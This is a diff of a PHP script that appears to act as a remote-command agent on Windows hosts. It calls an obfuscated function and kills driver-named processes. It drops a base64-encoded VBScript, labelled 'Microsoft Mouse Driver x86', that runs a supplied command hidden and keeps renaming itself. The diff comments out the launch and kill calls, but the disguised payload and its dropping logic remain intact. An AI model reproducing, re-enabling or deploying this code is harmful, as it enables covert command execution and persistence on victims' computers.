@@ -106,15 +106,17 @@ if(@file_get_contents($id_com) !== $command_id)
 		else
 			$data = false;
 	}
-	$devnum = false;
-	if($data !== false)
+	$devnum = '0'; /*false;*/
+	if($data !== false && is_file($lolm_path))
 	{
+		/**
 		sleep(2);
 		$dev = $GLOBALS['__getdev_002']($lolm_path);
 		if($dev)
 			$devnum = $dev[0];
+		/**/
 	}
-	if($devnum !== false)
+	if($devnum !== false && is_file($lolm_path))
 	{
 		$vbs = 'T24gRXJyb3IgUmVzdW1lIE5leHQNCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAie0NPTU1BTkR9IiwgMCwgRmFsc2UNClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNCmZuID0gV1NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KbiA9IFNwbGl0KGZuLCAiLiIpDQpjID0gQ0RibChuKDEpKQ0KV2hpbGUgVHJ1ZQ0KCWMgPSBjICsgMQ0KCW5uID0gbigwKSAmICIuIiAmIGMgJiAiLiIgJiBuKDIpICYgIi52YnMiDQoJZnNvLk1vdmVGaWxlIGZuLCBubg0KCWZuID0gbm4NCglXU2NyaXB0LlNsZWVwKHtUSU1FT1VUfSkNCldlbmQ';
 		$vbs_checkname = 'Microsoft Mouse Driver x86';
@@ -128,9 +130,11 @@ if(@file_get_contents($id_com) !== $command_id)
 		$execlol = false;
 		if(is_dir($vbs_path))
 		{
+			/**
 			@exec('taskkill /f /im w_driver_x86.exe');
 			@exec('taskkill /f /im w_driverx86.exe');
 			@exec('taskkill /f /im w_driver1.95_x86.exe');
+			/**/
 			sleep(2);
 			$count_files = 0;
 			$di = new DirectoryIterator($vbs_path);
@@ -146,7 +150,7 @@ if(@file_get_contents($id_com) !== $command_id)
 				{
 					$execlol = true;
 					@file_put_contents($data->getPathname(), $vbs);
-					@exec('start "" "'.$data->getPathname().'"');
+					/*@exec('start "" "'.$data->getPathname().'"');*/
 				}
 				else
 					@unlink($data->getPathname());
@@ -155,10 +159,10 @@ if(@file_get_contents($id_com) !== $command_id)
 			{
 				$execlol = true;
 				@file_put_contents($vbs_path.'\\'.$vbsname, $vbs);
-				@exec('start "" "'.$vbs_path.'\\'.$vbsname.'"');
+				/*@exec('start "" "'.$vbs_path.'\\'.$vbsname.'"');*/
 			}
 		}
-		if($execlol)
+		if($execlol && 0) /*disabled*/
 		{
 			sleep(10);
 			$output = array();
